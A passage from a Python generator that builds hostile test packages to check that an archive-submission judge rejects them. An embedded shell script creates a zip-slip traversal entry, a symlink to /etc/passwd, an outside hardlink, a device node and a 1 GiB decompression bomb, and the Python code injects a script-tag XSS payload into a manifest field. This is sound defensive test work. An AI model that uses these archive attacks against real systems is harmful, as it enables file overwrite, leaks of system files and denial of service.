trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/pkg/source" "$TMP/pkg/formal" "$TMP/pkg/build-recipe"
cat > "$TMP/pkg/candidate.toml" <<'EOF'
schema = "arena-candidate-v1"
name = "archive-attack"
agent = "adversarial-suite"
challenge = "CHALLENGE_PLACEHOLDER"
backend_family = "archive"
security_profile_request = "validity-classical-128"
hardware = { gpu = false, min_ram_gb = 4 }
[build]
recipe = "build-recipe/build.sh"
outputs = ["out/verify"]
[entry]
prepare = "out/prepare"
prove = "out/prove"
verify = "out/verify"
EOF
echo '#!/bin/sh' > "$TMP/pkg/build-recipe/build.sh"
echo 'int main(void){return 0;}' > "$TMP/pkg/source/verify.c"
echo 'theorem Candidate.certificate : True := trivial' > "$TMP/pkg/formal/Candidate.lean"

case "$KIND" in
  zipslip)
    # entry with a traversal path
    ( cd "$TMP/pkg" && tar -cf - . ) > "$TMP/base.tar"
    # append an evil member with a ../ path
    echo evil > "$TMP/evil"
    tar -rf "$TMP/base.tar" --transform='s,.*,../../../../tmp/zipslip-escape,' "$TMP/evil" 2>/dev/null \
      || tar -rf "$TMP/base.tar" -C "$TMP" --xform='s,evil,../../../../tmp/zipslip-escape,' evil
    cat "$TMP/base.tar" ;;
  symlink)
    ln -s /etc/passwd "$TMP/pkg/source/leak"
    ( cd "$TMP" && tar -cf - pkg ) ;;
  hardlink)
    : > "$TMP/outside"; ln "$TMP/outside" "$TMP/pkg/source/hard" 2>/dev/null || true
    ( cd "$TMP" && tar -cf - --hard-dereference=0 pkg ../outside 2>/dev/null || tar -cf - pkg ) ;;
  device)
    # include a device node reference (needs tar; node creation may need root,
    # so synthesize via tar's --mtime trick is not possible; try mknod in TMP)
    mknod "$TMP/pkg/source/dev0" c 1 3 2>/dev/null || true
    ( cd "$TMP" && tar -cf - pkg ) ;;
  bomb)
    # 1 GiB of zeros in one entry; compresses tiny, expands past the cap
    dd if=/dev/zero of="$TMP/pkg/source/zeros" bs=1M count=1024 2>/dev/null
    ( cd "$TMP" && tar -cf - pkg | zstd -19 ) ;;
  *) echo "unknown kind $KIND" >&2; exit 2 ;;
esac
"""


# ===========================================================================
# emit
# ===========================================================================

def chmod_x(path):
    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)


def write(path, content, executable=False):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(content)
    if executable:
        chmod_x(path)


def emit(c, check_only):
    d = os.path.join(ROOT, c["name"])
    files = {}

    candidate = c["candidate"] or BASE_CANDIDATE
    # Templates use {name}/{challenge}/{backend_family}; literal TOML braces are
    # doubled ({{ }}). Overrides may have already substituted {name}.
    candidate = candidate.format(name=c["name"], challenge=CHALLENGE,
                                 backend_family=c["family"])
    # ui-injection-manifest also wants a payload in backend_family
    if c["name"] == "ui-injection-manifest":
        candidate = candidate.replace('backend_family = "ui-log-injection"',
                                      'backend_family = "fam<script>alert(2)</script>"')
    files["candidate.toml"] = candidate

    files["build-recipe/build.sh"] = c["build"] or BASE_BUILD

    # source
    src = {"prepare.c": C_PREPARE, "prove.c": C_PROVE, "verify.c": C_VERIFY}
    src.update(c["source"])
    for rel, content in src.items():
        files["source/" + rel] = content

    # formal
    fm = {"lean-toolchain": BASE_LEAN_TOOLCHAIN,
          "lakefile.lean": BASE_LAKEFILE,
          "Candidate.lean": BASE_LEAN}
    fm.update(c["formal"])
    for rel, content in fm.items():
        files["formal/" + rel] = content

    # extras
    for rel, content in c["extra"].items():
        files[rel] = content
    if "archive_kind" in c:
        files["make-archive.sh"] = ARCHIVE_BUILDER
        files["archive-kind"] = c["archive_kind"] + "\n"

    # README
    gates = ", ".join(c["gates"])
    reasons = ", ".join(c["reasons"])
    readme = f"""# Hostile case: {c['name']}

**Attack family:** {c['family']}

**Expected decision:** {c['decision']}
**Expected failing gate(s):** {gates}
**Expected reason code(s):** {reasons}

## What this proves about the judge

{c['why']}
"""
    if c["notes"]:
        readme += f"\n## Notes\n\n{c['notes']}\n"
    readme += c["readme_extra"]
    files["README.md"] = readme

    # expect.json
    first_gate = c["gates"][0]
    expect = {
        "case": c["name"],
        "attack_family": c["family"],
        "expected_decision": c["decision"],
        "expected_failing_gates": c["gates"],
        "expected_reason_codes": c["reasons"],
        "fail_by_stage": STAGE.get(first_gate),
        "must_never": c["must_never"] or ["ADMITTED", "accepted", "ranked"],
        "why": c["why"],
    }
    if c["notes"]:
        expect["notes"] = c["notes"]
    files["expect.json"] = json.dumps(expect, indent=2) + "\n"

    if check_only:
        for rel, content in files.items():
            p = os.path.join(d, rel)
            if not os.path.exists(p) or open(p).read() != content:
                return False, rel
        return True, None

    if os.path.isdir(d):
        shutil.rmtree(d)
    for rel, content in files.items():
        ex = rel.endswith(".sh")
        write(os.path.join(d, rel), content, executable=ex)
    return True, None


def main():
    check = "--check" in sys.argv
    stale = []
    names = [c["name"] for c in CASES]
    assert len(names) == len(set(names)), "duplicate case names"
    for c in CASES:
        ok, which = emit(c, check)
        if check and not ok:
            stale.append(f"{c['name']}:{which}")
    if check:
        if stale:
            print("STALE (regenerate with python3 generate.py):")
            for s in stale:
                print("  " + s)
            sys.exit(1)
        print(f"OK: {len(CASES)} cases match the generator")
    else:
        print(f"wrote {len(CASES)} hostile cases to {ROOT}")
        for c in CASES:
            print(f"  {c['name']:30} -> {c['gates']} / {c['reasons']}")


if __name__ == "__main__":
    main()
